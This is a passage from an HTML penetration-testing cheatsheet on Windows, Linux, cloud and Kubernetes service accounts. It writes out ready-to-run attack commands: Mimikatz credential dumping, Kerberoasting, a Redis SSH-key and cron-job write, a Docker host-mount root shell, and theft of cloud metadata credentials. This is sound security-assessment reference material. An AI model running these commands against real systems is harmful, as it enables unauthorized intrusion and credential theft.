<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Service Accounts Cheatsheet - Pentester Reference</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --primary: #2c3e50;
            --secondary: #34495e;
            --accent: #e74c3c;
            --success: #27ae60;
            --warning: #f39c12;
            --critical: #c0392b;
            --bg: #ecf0f1;
            --card-bg: #ffffff;
            --text: #2c3e50;
            --text-light: #7f8c8d;
            --border: #bdc3c7;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: var(--bg);
            color: var(--text);
            line-height: 1.6;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }

        header {
            background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
            color: white;
            padding: 30px 20px;
            margin-bottom: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }

        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }

        header p {
            font-size: 1.1em;
            opacity: 0.9;
        }

        .search-container {
            background: var(--card-bg);
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 30px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }

        .search-box {
            width: 100%;
            padding: 15px 20px;
            font-size: 16px;
            border: 2px solid var(--border);
            border-radius: 8px;
            outline: none;
            transition: border-color 0.3s;
        }

        .search-box:focus {
            border-color: var(--accent);
        }

        .stats {
            display: flex;
            gap: 20px;
            margin-top: 15px;
            font-size: 14px;
            color: var(--text-light);
        }

        .category {
            background: var(--card-bg);
            margin-bottom: 20px;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            transition: all 0.3s;
        }

        .category.hidden {
            display: none;
        }

        .category-header {
            background: var(--secondary);
            color: white;
            padding: 15px 20px;
            cursor: pointer;
            display: flex;
            justify-content: space-between;
            align-items: center;
            user-select: none;
        }

        .category-header:hover {
            background: var(--primary);
        }

        .category-header h2 {
            font-size: 1.3em;
        }

        .toggle-icon {
            transition: transform 0.3s;
        }

        .category.collapsed .toggle-icon {
            transform: rotate(-90deg);
        }

        .category-content {
            padding: 20px;
            max-height: 3000px;
            overflow: hidden;
            transition: max-height 0.3s ease-out, padding 0.3s;
        }

        .category.collapsed .category-content {
            max-height: 0;
            padding: 0 20px;
        }

        .service-account {
            margin-bottom: 25px;
            padding: 15px;
            border-left: 4px solid var(--accent);
            background: #f8f9fa;
            border-radius: 5px;
        }

        .service-account.hidden {
            display: none;
        }

        .account-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }

        .account-name {
            font-size: 1.2em;
            font-weight: bold;
            color: var(--primary);
            font-family: 'Courier New', monospace;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            gap: 10px;
        }

        .account-name:hover {
            color: var(--accent);
        }

        .privilege-badge {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 12px;
            font-size: 0.75em;
            font-weight: bold;
            text-transform: uppercase;
        }

        .badge-system {
            background: #e74c3c;
            color: white;
        }

        .badge-high {
            background: #f39c12;
            color: white;
        }

        .badge-medium {
            background: #3498db;
            color: white;
        }

        .badge-low {
            background: #95a5a6;
            color: white;
        }

        .account-info {
            margin: 10px 0;
        }

        .info-row {
            display: grid;
            grid-template-columns: 150px 1fr;
            gap: 15px;
            padding: 8px;
            background: white;
            margin: 5px 0;
            border-radius: 5px;
        }

        .info-label {
            font-weight: 600;
            color: var(--text-light);
        }

        .info-value {
            font-family: 'Courier New', monospace;
            color: var(--primary);
        }

        .description {
            background: #e8f4f8;
            padding: 12px;
            border-radius: 5px;
            margin: 10px 0;
            border-left: 3px solid #3498db;
        }

        .security-note {
            background: #fff3cd;
            border-left: 3px solid var(--warning);
            padding: 12px;
            border-radius: 5px;
            margin: 10px 0;
        }

        .security-note.critical {
            background: #f8d7da;
            border-left-color: var(--critical);
        }

        .permissions-list {
            background: white;
            padding: 12px;
            border-radius: 5px;
            margin: 10px 0;
        }

        .permissions-list ul {
            margin-left: 20px;
        }

        .permissions-list li {
            margin: 5px 0;
        }

        .exploit-techniques {
            background: #ffe8e8;
            padding: 12px;
            border-radius: 5px;
            margin: 10px 0;
            border-left: 3px solid var(--accent);
        }

        .exploit-techniques h4 {
            color: var(--accent);
            margin-bottom: 8px;
        }

        .code-block {
            background: #2c3e50;
            color: #ecf0f1;
            padding: 12px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
            overflow-x: auto;
            margin: 10px 0;
            cursor: pointer;
            position: relative;
        }

        .code-block:hover {
            background: #34495e;
        }

        .code-block::after {
            content: 'Click to copy';
            position: absolute;
            right: 10px;
            top: 10px;
            font-size: 0.8em;
            opacity: 0.6;
        }

        .expand-collapse-all {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
        }

        .btn {
            padding: 10px 20px;
            background: var(--secondary);
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
            transition: background 0.3s;
        }

        .btn:hover {
            background: var(--primary);
        }

        .toast {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: var(--success);
            color: white;
            padding: 15px 25px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.2);
            opacity: 0;
            transform: translateY(20px);
            transition: all 0.3s;
            z-index: 1000;
        }

        .toast.show {
            opacity: 1;
            transform: translateY(0);
        }

        .warning-banner {
            background: #fff3cd;
            border: 2px solid var(--warning);
            padding: 15px 20px;
            border-radius: 8px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .warning-icon {
            font-size: 24px;
        }

        .footer {
            background: var(--card-bg);
            padding: 20px;
            border-radius: 10px;
            margin-top: 30px;
            text-align: center;
            color: var(--text-light);
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }

        @media (max-width: 768px) {
            header h1 {
                font-size: 1.8em;
            }

            .info-row {
                grid-template-columns: 1fr;
                gap: 5px;
            }

            .account-header {
                flex-direction: column;
                align-items: flex-start;
                gap: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>üë§ Service Accounts Cheatsheet</h1>
            <p>Comprehensive reference for system and service accounts encountered during penetration testing</p>
        </header>

        <div class="warning-banner">
            <span class="warning-icon">‚ö†Ô∏è</span>
            <div>
                <strong>Authorized Testing Only</strong> - This reference is for security assessments with proper authorization.
                Unauthorized access to service accounts may violate laws and regulations.
            </div>
        </div>

        <div class="search-container">
            <input type="text" id="searchBox" class="search-box" placeholder="üîç Search by account name, OS, privilege level, or description...">
            <div class="stats">
                <span id="visibleCount">Loading...</span>
                <span>|</span>
                <span>Click account names or code blocks to copy</span>
            </div>
        </div>

        <div class="expand-collapse-all">
            <button class="btn" onclick="expandAll()">Expand All</button>
            <button class="btn" onclick="collapseAll()">Collapse All</button>
        </div>

        <div id="categories"></div>

        <div class="footer">
            <p><strong>Last Updated:</strong> 2024 | <strong>Purpose:</strong> Security assessment reference</p>
            <p style="margin-top: 10px; font-size: 0.9em;">Always verify account permissions and privileges in the target environment</p>
        </div>
    </div>

    <div id="toast" class="toast"></div>

    <script>
        const serviceAccounts = [
            {
                category: "Windows Service Accounts",
                icon: "ü™ü",
                accounts: [
                    {
                        name: "SYSTEM / LocalSystem / NT AUTHORITY\\SYSTEM",
                        privilege: "system",
                        uid: "S-1-5-18",
                        description: "Most powerful account on Windows. Has unrestricted access to all local resources.",
                        permissions: [
                            "Full control over all files and registry",
                            "Can load device drivers",
                            "Can act as part of the operating system",
                            "Can debug programs",
                            "SeDebugPrivilege, SeTcbPrivilege, SeBackupPrivilege, SeRestorePrivilege"
                        ],
                        commonServices: "Task Scheduler, Windows Update, LSA, NTFS, many drivers",
                        securityNote: "Services running as SYSTEM are prime targets for privilege escalation. Compromising a SYSTEM service = full control.",
                        critical: true,
                        techniques: [
                            "Check for unquoted service paths",
                            "Weak service permissions (sc qc, accesschk)",
                            "DLL hijacking opportunities",
                            "Token impersonation attacks"
                        ],
                        commands: [
                            "# Enumerate SYSTEM services",
                            'wmic service where "startname=\'LocalSystem\'" get name,pathname,startmode',
                            "",
                            "# Check service permissions",
                            'accesschk.exe -ucqv "ServiceName"',
                            "",
                            "# Get SYSTEM via service",
                            'sc.exe create "NewService" binpath="cmd.exe /c whoami > C:\\temp\\proof.txt" start=auto',
                            'sc.exe start "NewService"'
                        ]
                    },
                    {
                        name: "LOCAL SERVICE / NT AUTHORITY\\LocalService",
                        privilege: "low",
                        uid: "S-1-5-19",
                        description: "Limited local account with privileges similar to anonymous users. Cannot access network resources with credentials.",
                        permissions: [
                            "Minimal local privileges",
                            "Accesses network as anonymous (no credentials)",
                            "Read access to most system files",
                            "Cannot write to system directories"
                        ],
                        commonServices: "Windows Time, DHCP Client, TCP/IP NetBIOS Helper, BFE",
                        securityNote: "Lower risk but can still be used for lateral reconnaissance. Limited escalation potential.",
                        techniques: [
                            "Check for misconfigured file permissions",
                            "Look for writable scheduled tasks",
                            "Token impersonation if other tokens available"
                        ],
                        commands: [
                            "# Find LocalService services",
                            'Get-WmiObject win32_service | Where-Object {$_.StartName -eq "NT AUTHORITY\\LocalService"}',
                            "",
                            "# Check privileges",
                            "whoami /priv"
                        ]
                    },
                    {
                        name: "NETWORK SERVICE / NT AUTHORITY\\NetworkService",
                        privilege: "medium",
                        uid: "S-1-5-20",
                        description: "Has significant local privileges and can authenticate to network resources using the computer account credentials.",
                        permissions: [
                            "More privileges than LocalService",
                            "Authenticates to network as MACHINE$",
                            "Can access network shares with computer account",
                            "Write access to some system directories"
                        ],
                        commonServices: "DNS Client, Windows Event Log, IIS Application Pools (default), WinRM",
                        securityNote: "Can be leveraged for network attacks. Access to computer account credentials enables lateral movement.",
                        techniques: [
                            "Kerberos attacks using machine account",
                            "NTLM relay attacks",
                            "Service account token impersonation",
                            "Unconstrained delegation abuse if configured"
                        ],
                        commands: [
                            "# Enumerate NetworkService services",
                            'Get-WmiObject win32_service | Where-Object {$_.StartName -eq "NT AUTHORITY\\NetworkService"}',
                            "",
                            "# Get computer account credentials",
                            "Invoke-Mimikatz -Command '\"sekurlsa::logonpasswords\"'",
                            "",
                            "# Check for delegation",
                            'Get-ADComputer $env:COMPUTERNAME -Properties TrustedForDelegation'
                        ]
                    },
                    {
                        name: "IIS APPPOOL\\{AppPoolName}",
                        privilege: "medium",
                        description: "Application pool identity for IIS. Each app pool can have its own isolated identity.",
                        permissions: [
                            "Similar to NetworkService by default",
                            "Access to application directories",
                            "Can read applicationHost.config",
                            "Access to IIS configuration and logs"
                        ],
                        commonServices: "IIS Application Pools (DefaultAppPool, .NET v4.5, etc.)",
                        securityNote: "Check for stored credentials in web.config, connection strings, and applicationHost.config.",
                        techniques: [
                            "Extract credentials from web.config",
                            "Read applicationHost.config for cleartext passwords",
                            "Access database connection strings",
                            "File upload to webroot for RCE"
                        ],
                        commands: [
                            "# List app pools and identities",
                            "%windir%\\system32\\inetsrv\\appcmd.exe list apppools",
                            "",
                            "# Read applicationHost.config",
                            "type %windir%\\system32\\inetsrv\\config\\applicationHost.config",
                            "",
                            "# Decrypt passwords",
                            "%windir%\\system32\\inetsrv\\appcmd.exe list apppool /text:*",
                            "",
                            "# Look for credentials",
                            'findstr /si "password" C:\\inetpub\\*.config'
                        ]
                    },
                    {
                        name: "Virtual Account: NT SERVICE\\{ServiceName}",
                        privilege: "medium",
                        description: "Managed local accounts that provide isolated service identity without password management. Introduced in Windows 7/2008 R2.",
                        permissions: [
                            "Acts as computer account on network",
                            "Isolated per-service permissions",
                            "No password management required",
                            "Can access network resources as MACHINE$"
                        ],
                        commonServices: "SQL Server (MSSQLSERVER), MSSQL Agent, various Windows services",
                        securityNote: "These accounts have access to service-specific resources and can authenticate to network as the machine account.",
                        techniques: [
                            "SQL Server exploitation if running as virtual account",
                            "Service-specific credential theft",
                            "Network authentication as machine account"
                        ],
                        commands: [
                            "# Enumerate virtual service accounts",
                            'Get-WmiObject win32_service | Where-Object {$_.StartName -like "NT SERVICE\\*"}',
                            "",
                            "# Check SQL Server service account",
                            'Get-Service MSSQLSERVER | Select-Object Name, StartType, Status'
                        ]
                    },
                    {
                        name: "Domain Service Accounts",
                        privilege: "high",
                        description: "Domain accounts used to run services. Often have SPNs (Service Principal Names) registered and may have elevated privileges.",
                        permissions: [
                            "Domain user privileges minimum",
                            "Often granted excessive permissions",
                            "May have 'Log on as a service' right",
                            "Access to network resources with domain credentials"
                        ],
                        commonServices: "SQL Server, IIS, custom applications, scheduled tasks",
                        securityNote: "Prime targets for Kerberoasting attacks. Often configured with weak passwords and excessive privileges.",
                        critical: true,
                        techniques: [
                            "Kerberoasting (request service tickets and crack offline)",
                            "Credential dumping if compromised",
                            "SPN scanning for discovery",
                            "Check for delegation configurations (unconstrained/constrained)"
                        ],
                        commands: [
                            "# Find service accounts with SPNs",
                            'Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName',
                            "",
                            "# Kerberoasting with Rubeus",
                            'Rubeus.exe kerberoast /outfile:hashes.txt',
                            "",
                            "# Kerberoasting with Impacket",
                            'GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request',
                            "",
                            "# Find delegation",
                            'Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation'
                        ]
                    },
                    {
                        name: "gMSA (Group Managed Service Account)",
                        privilege: "high",
                        description: "Automatically managed service accounts with 240-character passwords that rotate automatically. Introduced in Windows Server 2012.",
                        permissions: [
                            "Domain account with managed credentials",
                            "No manual password management",
                            "Can be used across multiple servers",
                            "Password automatically rotated"
                        ],
                        commonServices: "Enterprise services requiring high security",
                        securityNote: "More secure than traditional service accounts but can still be extracted if you compromise an authorized host.",
                        techniques: [
                            "Extract gMSA password from authorized host",
                            "Read msDS-ManagedPassword attribute",
                            "Check gMSA group membership for authorized hosts"
                        ],
                        commands: [
                            "# Find gMSA accounts",
                            'Get-ADServiceAccount -Filter * -Properties *',
                            "",
                            "# Get gMSA password (requires authorized host)",
                            'Get-ADServiceAccount -Identity gmsaAccount -Properties msDS-ManagedPassword',
                            "",
                            "# Extract gMSA credentials with DSInternals",
                            '$mp = Get-ADServiceAccount -Identity gmsaAccount -Properties msDS-ManagedPassword',
                            '$mp."msDS-ManagedPassword"'
                        ]
                    }
                ]
            },
            {
                category: "Linux Service Accounts",
                icon: "üêß",
                accounts: [
                    {
                        name: "root",
                        privilege: "system",
                        uid: "0",
                        gid: "0",
                        description: "Superuser account with complete control over the system. UID 0 is root regardless of name.",
                        permissions: [
                            "Unrestricted access to all files and commands",
                            "Can change any file ownership and permissions",
                            "Can load kernel modules",
                            "Can bind to privileged ports (<1024)",
                            "Full system control"
                        ],
                        commonServices: "Critical system services, SSH (initial), init/systemd",
                        securityNote: "Ultimate privilege escalation target. Any path to root = full system compromise.",
                        critical: true,
                        techniques: [
                            "SUID binary exploitation",
                            "Kernel exploits",
                            "Sudo misconfigurations",
                            "Cron job hijacking",
                            "Capabilities abuse"
                        ],
                        commands: [
                            "# Check if running as root",
                            "id",
                            "whoami",
                            "",
                            "# Find SUID root binaries",
                            "find / -perm -4000 -user root 2>/dev/null",
                            "",
                            "# Check sudo permissions",
                            "sudo -l",
                            "",
                            "# Check capabilities",
                            "getcap -r / 2>/dev/null"
                        ]
                    },
                    {
                        name: "www-data",
                        privilege: "low",
                        uid: "33",
                        gid: "33",
                        description: "Default web server user for Apache and Nginx on Debian/Ubuntu systems. Runs web applications.",
                        permissions: [
                            "Read/write access to /var/www (typically)",
                            "Execute permissions for web scripts",
                            "Limited system access",
                            "Cannot bind to privileged ports directly"
                        ],
                        commonServices: "Apache2, Nginx, PHP-FPM on Debian/Ubuntu",
                        securityNote: "Common initial foothold via web application exploits. Check for sudo rights, writable cron jobs, and SUID binaries.",
                        techniques: [
                            "Web shell upload and execution",
                            "Check sudo -l for escalation paths",
                            "Look for writable systemd service files",
                            "Search for credentials in web app configs",
                            "Enumerate database connection strings"
                        ],
                        commands: [
                            "# Common paths for www-data",
                            "ls -la /var/www/html",
                            "",
                            "# Find writable files",
                            "find /var/www -writable 2>/dev/null",
                            "",
                            "# Check for database credentials",
                            "grep -r 'password' /var/www/*/config* 2>/dev/null",
                            "",
                            "# Look for SSH keys",
                            "find /var/www -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null"
                        ]
                    },
                    {
                        name: "apache / httpd",
                        privilege: "low",
                        uid: "48 (RHEL/CentOS)",
                        gid: "48",
                        description: "Web server user on RHEL/CentOS/Fedora systems. Equivalent to www-data on Debian systems.",
                        permissions: [
                            "Read/write to /var/www/html",
                            "Execute web scripts",
                            "Access to Apache configuration (read)",
                            "Limited system privileges"
                        ],
                        commonServices: "Apache HTTP Server on RHEL/CentOS",
                        securityNote: "Similar attack surface to www-data. Often has access to application secrets and database credentials.",
                        techniques: [
                            "Same as www-data",
                            "Check SELinux context for additional restrictions",
                            "Look for httpd config files with credentials"
                        ],
                        commands: [
                            "# Check Apache user",
                            "ps aux | grep httpd | head -1",
                            "",
                            "# Read Apache config",
                            "cat /etc/httpd/conf/httpd.conf",
                            "",
                            "# Find web application credentials",
                            "grep -r 'password\\|passwd\\|pwd' /var/www 2>/dev/null"
                        ]
                    },
                    {
                        name: "nginx",
                        privilege: "low",
                        uid: "Varies (often 33 or 101)",
                        gid: "Varies",
                        description: "Nginx web server user. Often the same as www-data on some distributions.",
                        permissions: [
                            "Read access to web content",
                            "Write access to upload directories if configured",
                            "Execute PHP/application code",
                            "Access to nginx configuration files"
                        ],
                        commonServices: "Nginx web server",
                        securityNote: "Check nginx configuration for upstream servers, proxy configurations, and authentication mechanisms.",
                        techniques: [
                            "Upload web shells to writable directories",
                            "Extract credentials from config files",
                            "Exploit misconfigured proxy settings",
                            "Access backend services via SSRF"
                        ],
                        commands: [
                            "# Check nginx config",
                            "cat /etc/nginx/nginx.conf",
                            "cat /etc/nginx/sites-enabled/*",
                            "",
                            "# Find writable locations",
                            "find /var/www -type d -writable 2>/dev/null"
                        ]
                    },
                    {
                        name: "mysql",
                        privilege: "medium",
                        uid: "Varies",
                        gid: "Varies",
                        description: "MySQL/MariaDB database server account. Has access to database files and configurations.",
                        permissions: [
                            "Full access to /var/lib/mysql",
                            "Read access to my.cnf configuration",
                            "Can read database files directly",
                            "May have file permissions for LOAD DATA INFILE"
                        ],
                        commonServices: "MySQL Server, MariaDB Server",
                        securityNote: "Can read database files directly from filesystem. Check for UDF exploits and file read capabilities.",
                        techniques: [
                            "Direct database file access",
                            "UDF (User Defined Function) privilege escalation",
                            "Read mysql.user table for password hashes",
                            "Exploit LOAD DATA INFILE for file read",
                            "Check for mysql running as root (misconfiguration)"
                        ],
                        commands: [
                            "# Read MySQL config",
                            "cat /etc/mysql/my.cnf",
                            "cat /etc/my.cnf",
                            "",
                            "# Access database files",
                            "ls -la /var/lib/mysql/",
                            "",
                            "# Check MySQL process owner",
                            "ps aux | grep mysqld"
                        ]
                    },
                    {
                        name: "postgres",
                        privilege: "medium",
                        uid: "Varies",
                        gid: "Varies",
                        description: "PostgreSQL database server account with access to all database files and configurations.",
                        permissions: [
                            "Full access to /var/lib/postgresql",
                            "Read/write database files",
                            "Access to pg_hba.conf and postgresql.conf",
                            "May have COPY TO/FROM FILE permissions"
                        ],
                        commonServices: "PostgreSQL Server",
                        securityNote: "Can read/write arbitrary files with COPY if configured. Check for CVE exploits and misconfigurations.",
                        techniques: [
                            "File read/write via COPY TO/FROM",
                            "Code execution via PostgreSQL extensions",
                            "Read pg_hba.conf for authentication settings",
                            "Dump database credentials and hashes"
                        ],
                        commands: [
                            "# Read PostgreSQL config",
                            "cat /etc/postgresql/*/main/postgresql.conf",
                            "cat /etc/postgresql/*/main/pg_hba.conf",
                            "",
                            "# Access data directory",
                            "ls -la /var/lib/postgresql/"
                        ]
                    },
                    {
                        name: "redis",
                        privilege: "medium",
                        uid: "Varies",
                        gid: "Varies",
                        description: "Redis database server account. Often misconfigured with no authentication.",
                        permissions: [
                            "Access to /var/lib/redis",
                            "Read/write RDB and AOF files",
                            "May have network access",
                            "Access to redis.conf"
                        ],
                        commonServices: "Redis Server",
                        securityNote: "Frequently exposed without authentication. Can write files via Redis commands for RCE.",
                        critical: true,
                        techniques: [
                            "Unauthenticated access exploitation",
                            "Cron job creation via CONFIG SET",
                            "SSH key injection",
                            "Write web shell to webroot",
                            "Master/slave replication for RCE"
                        ],
                        commands: [
                            "# Connect to Redis",
                            "redis-cli -h 127.0.0.1",
                            "",
                            "# Write SSH key",
                            "redis-cli flushall",
                            "cat id_rsa.pub | redis-cli -x set crackit",
                            "redis-cli config set dir /home/user/.ssh/",
                            "redis-cli config set dbfilename authorized_keys",
                            "redis-cli save",
                            "",
                            "# Write cron job",
                            "redis-cli config set dir /var/spool/cron/",
                            "redis-cli config set dbfilename root",
                            "redis-cli save"
                        ]
                    },
                    {
                        name: "mongodb",
                        privilege: "medium",
                        uid: "Varies",
                        gid: "Varies",
                        description: "MongoDB database server account. Often runs without authentication by default.",
                        permissions: [
                            "Access to /var/lib/mongodb",
                            "Read/write database files",
                            "Network access if exposed",
                            "Access to mongod.conf"
                        ],
                        commonServices: "MongoDB Server",
                        securityNote: "Frequently deployed without authentication. Check for exposed instances and data extraction opportunities.",
                        techniques: [
                            "Unauthenticated database access",
                            "Data exfiltration",
                            "JavaScript execution in queries",
                            "Check for CVEs (e.g., CVE-2015-1609)"
                        ],
                        commands: [
                            "# Connect to MongoDB",
                            "mongo",
                            "",
                            "# List databases",
                            "show dbs",
                            "",
                            "# Check authentication",
                            "cat /etc/mongod.conf | grep auth"
                        ]
                    },
                    {
                        name: "docker",
                        privilege: "system",
                        uid: "Varies",
                        gid: "Varies",
                        description: "Docker daemon user. Members of the docker group have effective root access.",
                        permissions: [
                            "Full access to Docker socket",
                            "Can create privileged containers",
                            "Mount host filesystem in containers",
                            "Effective root via container escape"
                        ],
                        commonServices: "Docker daemon",
                        securityNote: "Docker group membership = root. Can mount host filesystem or run privileged containers for full system access.",
                        critical: true,
                        techniques: [
                            "Mount host root filesystem in container",
                            "Create privileged container",
                            "Access Docker socket for container escape",
                            "Deploy malicious images"
                        ],
                        commands: [
                            "# Check docker group membership",
                            "groups",
                            "id",
                            "",
                            "# Mount host filesystem and get root shell",
                            "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
                            "",
                            "# Privileged container escape",
                            "docker run --rm -it --privileged --net=host --pid=host --ipc=host alpine",
                            "",
                            "# Access host via docker exec",
                            "docker run -v /:/hostfs -it ubuntu bash"
                        ]
                    },
                    {
                        name: "systemd-network",
                        privilege: "low",
                        uid: "Varies",
                        gid: "Varies",
                        description: "systemd network management daemon user. Manages network configuration.",
                        permissions: [
                            "Configure network interfaces",
                            "Read network configuration",
                            "Limited system access"
                        ],
                        commonServices: "systemd-networkd",
                        securityNote: "Limited attack surface but may have access to network credentials or VPN configurations.",
                        techniques: [
                            "Access to network configs",
                            "VPN credential extraction",
                            "Network eavesdropping if capabilities allow"
                        ],
                        commands: [
                            "# Check network configs",
                            "ls -la /etc/systemd/network/",
                            "",
                            "# View networkd status",
                            "networkctl status"
                        ]
                    },
                    {
                        name: "systemd-timesync",
                        privilege: "low",
                        uid: "Varies",
                        gid: "Varies",
                        description: "systemd time synchronization daemon. Very limited privileges.",
                        permissions: [
                            "Synchronize system time",
                            "Minimal system access"
                        ],
                        commonServices: "systemd-timesyncd",
                        securityNote: "Very limited attack surface. Rarely useful for privilege escalation.",
                        techniques: ["Time manipulation attacks (very limited use cases)"],
                        commands: ["timedatectl status"]
                    },
                    {
                        name: "nobody / nogroup",
                        privilege: "low",
                        uid: "65534",
                        gid: "65534",
                        description: "Minimal privilege account used for services that need no special permissions.",
                        permissions: [
                            "Minimal permissions",
                            "Cannot write to most directories",
                            "Used for untrusted operations"
                        ],
                        commonServices: "Various minimal-privilege services",
                        securityNote: "Least privileged account. Limited escalation opportunities.",
                        techniques: [
                            "Check for world-writable files",
                            "Look for misconfigured SUID binaries",
                            "Kernel exploits"
                        ],
                        commands: [
                            "# Find world-writable files",
                            "find / -perm -2 -type f 2>/dev/null",
                            "",
                            "# Find world-writable directories",
                            "find / -perm -2 -type d 2>/dev/null"
                        ]
                    }
                ]
            },
            {
                category: "Cloud Service Accounts",
                icon: "‚òÅÔ∏è",
                accounts: [
                    {
                        name: "AWS EC2 Instance Profile / IAM Role",
                        privilege: "varies",
                        description: "IAM roles attached to EC2 instances. Credentials available via instance metadata service.",
                        permissions: [
                            "Defined by attached IAM policies",
                            "Temporary credentials via metadata service",
                            "Can range from read-only to full admin",
                            "Credentials auto-rotate"
                        ],
                        commonServices: "AWS EC2 instances, ECS tasks, Lambda functions",
                        securityNote: "Accessible via IMDS at 169.254.169.254. Check for SSRF to access credentials. IMDSv2 requires token.",
                        critical: true,
                        techniques: [
                            "SSRF to metadata service",
                            "Steal credentials from instance metadata",
                            "Privilege escalation via IAM permissions",
                            "Assume other roles if permitted"
                        ],
                        commands: [
                            "# Get instance role name (IMDSv1)",
                            "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                            "",
                            "# Get credentials (IMDSv1)",
                            "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME",
                            "",
                            "# Get token for IMDSv2",
                            "TOKEN=`curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\"`",
                            "",
                            "# Get credentials (IMDSv2)",
                            "curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME",
                            "",
                            "# Check permissions",
                            "aws sts get-caller-identity",
                            "aws iam list-attached-role-policies --role-name ROLE-NAME"
                        ]
                    },
                    {
                        name: "GCP Service Account",
                        privilege: "varies",
                        description: "Google Cloud service accounts for application authentication. Credentials in JSON key files or metadata service.",
                        permissions: [
                            "Defined by IAM roles and permissions",
                            "Can have project-wide or resource-specific access",
                            "Access via JSON key files or metadata",
                            "Can impersonate other service accounts if permitted"
                        ],
                        commonServices: "GCE instances, Cloud Functions, Cloud Run, GKE",
                        securityNote: "Check for exposed JSON key files. Metadata service at http://metadata.google.internal. Look for overprivileged accounts.",
                        critical: true,
                        techniques: [
                            "Find JSON key files in code repositories",
                            "Access metadata service via SSRF",
                            "Service account impersonation",
                            "Privilege escalation via IAM permissions"
                        ],
                        commands: [
                            "# Get service account from metadata",
                            "curl \"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email\" -H \"Metadata-Flavor: Google\"",
                            "",
                            "# Get access token",
                            "curl \"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\" -H \"Metadata-Flavor: Google\"",
                            "",
                            "# List permissions",
                            "gcloud projects get-iam-policy PROJECT-ID",
                            "",
                            "# Check current identity",
                            "gcloud auth list",
                            "",
                            "# Activate service account from JSON key",
                            "gcloud auth activate-service-account --key-file=service-account.json"
                        ]
                    },
                    {
                        name: "Azure Managed Identity",
                        privilege: "varies",
                        description: "Azure AD identity automatically assigned to Azure resources. No credentials to manage.",
                        permissions: [
                            "Defined by Azure RBAC roles",
                            "System-assigned or user-assigned",
                            "Access via Azure Instance Metadata Service (IMDS)",
                            "Can access Azure resources and APIs"
                        ],
                        commonServices: "Azure VMs, App Services, Function Apps, Container Instances",
                        securityNote: "Accessible via IMDS. Check for SSRF vulnerabilities. Can access Key Vault, Storage, and other Azure resources.",
                        critical: true,
                        techniques: [
                            "SSRF to Azure IMDS",
                            "Steal managed identity tokens",
                            "Access Key Vault secrets",
                            "Privilege escalation via Azure RBAC"
                        ],
                        commands: [
                            "# Get access token (from Azure VM)",
                            "curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H Metadata:true",
                            "",
                            "# Get token for specific resource",
                            "curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net' -H Metadata:true",
                            "",
                            "# Use token to access Azure resources",
                            "az login --identity",
                            "az account show",
                            "",
                            "# List role assignments",
                            "az role assignment list --assignee OBJECT-ID"
                        ]
                    },
                    {
                        name: "Kubernetes Service Account",
                        privilege: "varies",
                        description: "Identity for pods running in Kubernetes. Each namespace has a default service account.",
                        permissions: [
                            "Defined by RBAC policies",
                            "Token mounted at /var/run/secrets/kubernetes.io/serviceaccount/",
                            "Can range from no access to cluster-admin",
                            "Access to Kubernetes API server"
                        ],
                        commonServices: "Kubernetes pods, deployments, jobs",
                        securityNote: "Default service accounts often overprivileged. Check for cluster-admin or high privileges. Token in predictable location.",
                        critical: true,
                        techniques: [
                            "Extract service account token from pod",
                            "Kubernetes API enumeration",
                            "Create privileged pods if permitted",
                            "Secret extraction from cluster",
                            "Container escape techniques"
                        ],
                        commands: [
                            "# Get service account token",
                            "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
                            "",
                            "# Get namespace",
                            "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace",
                            "",
                            "# Check permissions",
                            "kubectl auth can-i --list",
                            "",
                            "# Test API access",
                            "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)",
                            "curl -k -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default.svc/api/v1/namespaces",
                            "",
                            "# Create privileged pod (if allowed)",
                            "kubectl apply -f privileged-pod.yaml"
                        ]
                    }
                ]
            },
            {
                category: "Database Service Accounts",
                icon: "üóÑÔ∏è",
                accounts: [
                    {
                        name: "SQL Server Service Account (Windows)",
                        privilege: "high",
                        description: "Active Directory or local account running SQL Server. Often has excessive permissions.",
